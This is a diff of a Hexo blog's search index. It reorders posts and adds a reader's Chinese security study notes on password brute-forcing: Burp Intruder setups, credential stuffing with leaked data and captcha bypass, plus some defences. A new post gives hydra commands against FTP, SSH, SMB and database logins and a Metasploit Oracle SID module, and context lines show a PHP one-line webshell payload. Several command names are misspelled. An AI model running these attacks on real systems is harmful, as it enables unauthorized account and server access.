@@ -19,38 +19,61 @@
 ]]></content>
   </entry>
   <entry>
-    <title>hexo修改主题</title>
-    <url>/2022/08/06/hexo%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
-<li>默认主题千篇一律，要想有自己的东西，就要和别人不一样，所以搭建好自己的博客，当然要按照自己的喜好来布置主题啦</li>
+    <title>网络安全学习之密码爆破</title>
+    <url>/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><h3 id="四位数字爆破。"><a href="#四位数字爆破。" class="headerlink" title="四位数字爆破。"></a>四位数字爆破。</h3><ul>
+<li>抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
 </ul>
-<hr>
-<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><ul>
-<li>找到主题的下载链接,例如：<a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a> themes&#x2F;diaspora，然后在gitbash中输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Fechin/hexo-theme-diaspora.git themes/diaspora</span><br></pre></td></tr></table></figure></li>
+<h3 id="简单的脱弱口令爆破："><a href="#简单的脱弱口令爆破：" class="headerlink" title="简单的脱弱口令爆破："></a>简单的脱弱口令爆破：</h3><p>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</p>
+<h3 id="带验证码爆破？"><a href="#带验证码爆破？" class="headerlink" title="带验证码爆破？"></a>带验证码爆破？</h3><p>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</p>
+<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
+<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
 </ul>
-<h2 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h2><ul>
-<li>修改Hexo配置文件_config.yml主题设置为diaspora<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme:diaspora//注意，在这里的主题名要与themes文件夹中的主题文件名一致</span><br></pre></td></tr></table></figure></li>
+<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
+<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
 </ul>
-<h2 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h2><ul>
-<li>注意：在更新主题时备份_config.yml配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes/diaspora</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></li>
+<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/First.png" alt="例题"></p>
+<ul>
+<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/Second.png"></li>
 </ul>
-<h2 id="创建一个分类页面"><a href="#创建一个分类页面" class="headerlink" title="创建一个分类页面"></a>创建一个分类页面</h2><ul>
-<li>新建一个页面，命名为categories。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面的类型设置为categories<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure></li>
+<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
+<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
+<li>application….from urlLencode</li>
+<li>payload打开密码字典以换行为分割</li>
+<li>批量请求，寻找flag</li>
 </ul>
-<h2 id="创建标签页"><a href="#创建标签页" class="headerlink" title="创建标签页"></a>创建标签页</h2><ul>
-<li>新建一个页面，命名为tags。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面设置为tags<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>
+<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
+<li>token时间戳验证</li>
 </ul>
-<h2 id="创建搜索页"><a href="#创建搜索页" class="headerlink" title="创建搜索页"></a>创建搜索页</h2><ul>
-<li>需要安装hexo的搜索插件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></li>
-<li>安装完成后输入以下命令查看安装情况<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm <span class="built_in">ls</span> --depth 0//一般不需要，因为正常情况不会出现安装失败</span><br></pre></td></tr></table></figure></li>
-<li>配置hexo全局配置文件（请将生成的索引文件放在网站根目录或修改主题js文件的path值）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
-以上代码直接复制粘贴到全局配置文件中</li>
-<li>新建一个页面，命名为search。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page search</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面的类型设置为search<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;search&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li>在主题配置文件启用本地搜索（此配置文件在themes文件夹下）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地搜索,请将索引文件放在网站根目录</span></span><br><span class="line">local_search:</span><br><span class="line">    <span class="comment">#是否启用</span></span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li>最后部署到GitHub<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean//清除缓存</span><br><span class="line">hexo g//生成静态文件</span><br><span class="line">hexo s//启动服务器</span><br><span class="line">hexo d//部署，用于将网站部署到服务器上</span><br></pre></td></tr></table></figure></li>
+<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/4.png"></p>
+<ul>
+<li>工具：PKAV HTTP Fuzzer</li>
+<li>验证码识别重放模式为单线程</li>
+<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
+</ul>
+<h2 id="防止爆破的方法"><a href="#防止爆破的方法" class="headerlink" title="防止爆破的方法"></a>防止爆破的方法</h2><ul>
+<li>多因素认证，爆破次数太多会锁定，但漏洞会导致管理也无法登录。</li>
+<li>sso————统一登陆认证</li>
+<li>加密</li>
+<li>token</li>
+<li>验证码</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>网络安全学习之认证技术</title>
+    <url>/2022/08/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="系统认证爆破"><a href="#系统认证爆破" class="headerlink" title="系统认证爆破"></a>系统认证爆破</h2><h3 id="爆破工具："><a href="#爆破工具：" class="headerlink" title="爆破工具："></a>爆破工具：</h3><ul>
+<li>Hydar（九头蛇）<br><a href="https://github.com/vanhauser-thc/thc-hydar">https://github.com/vanhauser-thc/thc-hydar</a><br>常用口令<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># FTP爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt ftp://192.168.0.1 -vV    //大写字母表示导入一个字典。-vV爆出输出日志，看是什么时候成功的</span><br><span class="line"></span><br><span class="line"># SSH爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt ssh://192.168.0.1 --vV</span><br><span class="line"></span><br><span class="line"># SMB爆破</span><br><span class="line">hydar -l admin -P password.txt smb://10.211.55.9      //小写字母&quot;l表示单个用户</span><br><span class="line"></span><br><span class="line"># MSSQL爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt //192.168.0.1 mssql -vV</span><br><span class="line"></span><br><span class="line">#MYSQL爆破</span><br><span class="line">hydar -L /root/user.txt -P /root/passwword.txt //192.168.0.1 mysql -vV</span><br></pre></td></tr></table></figure></li>
+<li>SNETCarcker(超级弱口令工具)<br><a href="https://github.com/shack2/SNETCarcker">https://github.com/shack2/SNETCarcker</a><br>是一款windows平台的弱口令审计工具，支持批量多线程检查</li>
+<li>关闭防火墙</li>
+</ul>
+<h2 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h2><ul>
+<li>Oracle Datebase，又名Oracle RDBMS，或简称Oracle，是甲骨文公司的一款关系数据库管理系统。默认端口为1521端口，和其他数据库不同的是，爆破前得先爆破队赢得SID，不过SID很多都是默认的，可以使用MSF来进行爆破。</li>
+</ul>
+<h3 id="Metasploit爆破SID"><a href="#Metasploit爆破SID" class="headerlink" title="Metasploit爆破SID"></a>Metasploit爆破SID</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/sid_bruate</span><br><span class="line">set RH0STS 10.211.55.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="爆破-3306-MySQL"><a href="#爆破-3306-MySQL" class="headerlink" title="爆破 3306 MySQL"></a>爆破 3306 MySQL</h3><ul>
+<li>MySQL是一个关系型数据库管理系统，默认端口为3306<br>爆破前检测是否开启数据库外连，不要做无意义的爆破，可以手动写Python脚本来批量验证。</li>
 </ul>
 ]]></content>
   </entry>
@@ -109,6 +132,42 @@
 ]]></content>
   </entry>
   <entry>
+    <title>hexo修改主题</title>
+    <url>/2022/08/06/hexo%E4%B8%BB%E9%A2%98%E4%BF%AE%E6%94%B9/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li>默认主题千篇一律，要想有自己的东西，就要和别人不一样，所以搭建好自己的博客，当然要按照自己的喜好来布置主题啦</li>
+</ul>
+<hr>
+<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><ul>
+<li>找到主题的下载链接,例如：<a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a> themes&#x2F;diaspora，然后在gitbash中输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Fechin/hexo-theme-diaspora.git themes/diaspora</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h2><ul>
+<li>修改Hexo配置文件_config.yml主题设置为diaspora<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme:diaspora//注意，在这里的主题名要与themes文件夹中的主题文件名一致</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h2><ul>
+<li>注意：在更新主题时备份_config.yml配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes/diaspora</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建一个分类页面"><a href="#创建一个分类页面" class="headerlink" title="创建一个分类页面"></a>创建一个分类页面</h2><ul>
+<li>新建一个页面，命名为categories。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面的类型设置为categories<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建标签页"><a href="#创建标签页" class="headerlink" title="创建标签页"></a>创建标签页</h2><ul>
+<li>新建一个页面，命名为tags。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面设置为tags<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="创建搜索页"><a href="#创建搜索页" class="headerlink" title="创建搜索页"></a>创建搜索页</h2><ul>
+<li>需要安装hexo的搜索插件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></li>
+<li>安装完成后输入以下命令查看安装情况<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm <span class="built_in">ls</span> --depth 0//一般不需要，因为正常情况不会出现安装失败</span><br></pre></td></tr></table></figure></li>
+<li>配置hexo全局配置文件（请将生成的索引文件放在网站根目录或修改主题js文件的path值）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br></pre></td></tr></table></figure>
+以上代码直接复制粘贴到全局配置文件中</li>
+<li>新建一个页面，命名为search。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page search</span><br></pre></td></tr></table></figure></li>
+<li>编辑刚新建的页面，将页面的类型设置为search<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;search&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li>在主题配置文件启用本地搜索（此配置文件在themes文件夹下）<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#本地搜索,请将索引文件放在网站根目录</span></span><br><span class="line">local_search:</span><br><span class="line">    <span class="comment">#是否启用</span></span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>最后部署到GitHub<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean//清除缓存</span><br><span class="line">hexo g//生成静态文件</span><br><span class="line">hexo s//启动服务器</span><br><span class="line">hexo d//部署，用于将网站部署到服务器上</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
     <title>网络安全学习之文件上传</title>
     <url>/2022/08/08/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
@@ -144,40 +203,5 @@
 <li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
 </ul>
 <h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
-  </entry>
-  <entry>
-    <title>网络安全学习之密码爆破</title>
-    <url>/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h3><ul>
-<li>四位数字爆破。抓包添加payload，设置密码模块为数字即可，范围0000-9999<br>数字格式：<br>基地：Decimal<br>整数部分的最小位数：4<br>少数民族最小位数：0<br>少数最大字数：0<br>通过长度判断正确包</li>
-<li>简单的脱弱口令爆破：<br>找一个好用的字典，设置爆破参数和类型，加载字典。通过返回包长度判断。</li>
-<li>带验证码爆破？<br>注意：不要放包，只要一直不放包，验证码就不会失效，否则，验证码改变会导致爆破不成功。 （验证码复用）其余一样。</li>
-</ul>
-<h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><ul>
-<li>打开发现是一个类似于basic认证的框，输入数据抓包。<br>发现是base64加密字段，推测basic字段是 用户名：密码 这种格式的base64加密形式。在xintruder中添加basic的加密字段，payload1选择自定义迭代器（Custom itermtor）。<br>然后设置定位分隔符和用户名，在位置2添加密码即可<br>然后在有效荷载里面添加base64编码模块<br>因为base64会自动编码特殊字符，需要取消后面的payload url自动编码</li>
-</ul>
-<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><ul>
-<li>随便输入密码，发现密码是一串MD5值，解密发现是输入的密码，猜测是前端加密，同样的发送到intruder模块进行设置。<br>在payload的编码设置添加hash的md5加密模块</li>
-</ul>
-<h3 id="泄露数据撞库"><a href="#泄露数据撞库" class="headerlink" title="泄露数据撞库"></a>泄露数据撞库</h3><p><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/First.png" alt="例题"></p>
-<ul>
-<li>bp抓包，清掉所有变量，标记密码用户名，选择音叉攻击（一一对应的攻击），导入密码用户名开始攻击。通过返回长度找到正确的账号密码。<br><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/Second.png"></li>
-</ul>
-<h3 id="返回包特征提取爆破"><a href="#返回包特征提取爆破" class="headerlink" title="返回包特征提取爆破"></a>返回包特征提取爆破</h3><p><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/3.png"><br>若登陆成功和登陆失败返回的长度一样，则在options添加选项中，从返回包中获取返回的字段，可以直接在返回包中看到结果  </p>
-<h3 id="数据包传输类型"><a href="#数据包传输类型" class="headerlink" title="数据包传输类型"></a>数据包传输类型</h3><ul>
-<li>application….from urlLencode</li>
-<li>payload打开密码字典以换行为分割</li>
-<li>批量请求，寻找flag</li>
-</ul>
-<h3 id="简单的token验证"><a href="#简单的token验证" class="headerlink" title="简单的token验证"></a>简单的token验证</h3><ul>
-<li>token时间戳验证</li>
-</ul>
-<h3 id="识别验证码爆破"><a href="#识别验证码爆破" class="headerlink" title="识别验证码爆破"></a>识别验证码爆破</h3><p><img src="/2022/08/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/4.png"></p>
-<ul>
-<li>工具：PKAV HTTP Fuzzer</li>
-<li>验证码识别重放模式为单线程</li>
-<li>这次比之前增加了验证码验证模块，码源提示ocr，容易想到利用burp的插件来进行验证码识别爆破。<br>这里用的是captcha-killer插件，开源地址：<a href="http://github.com/c0ny1/captcha-killer">http://github.com/c0ny1/captcha-killer</a><br>先利用burp抓取生成验证码页面，发送到插件的验证码识别模块。</li>
-</ul>
-]]></content>
   </entry>
 </search>
